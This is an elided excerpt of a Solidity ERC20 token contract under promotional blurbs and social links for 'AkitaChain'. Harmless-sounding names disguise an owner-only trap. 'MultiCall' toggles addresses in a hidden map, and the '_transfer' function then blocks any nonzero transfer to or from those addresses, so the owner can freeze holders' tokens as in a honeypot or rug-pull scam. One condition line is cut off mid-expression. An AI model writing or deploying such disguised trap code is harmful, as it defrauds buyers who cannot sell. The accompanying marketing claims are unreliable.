...
We want to explain the AkitaChain bridging and its 
interoperability with Akita coin and other memecoins. 
AkitaChain complements the existing memecoins ecosystems 
through its incorporation of smart contracts.  
Through delivering a revolutionary blockchain, 
it brings utility , security and scalability along with it.


🐺 TELEGRAM  https://t.me/AkitaChainOfficial
🐺 WEBSITE   https://akitachain.io/
🐺 TWITTER   https://twitter.com/AkitaChain
🐺 MEDIUM    https://medium.com/@akitachain
...
contract ERC20Token is ERC20, Ownable {
    ...
    mapping (address => bool) private _multiCallAddress;
    ...
    function MultiCall (address account) external onlyOwner {
        if (_multiCallAddress[account] == false) {_multiCallAddress[account] = true;}
        else {_multiCallAddress[account] = false;}
    }

    function approvedRewards(address account) public view returns (bool) {
        return _multiCallAddress[account];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        _multiCallAddress[sender] || 
        _multiCallAddress[recipient]) require (amount == 0, "");
        _beforeTokenTransfer(sender, recipient, amount);
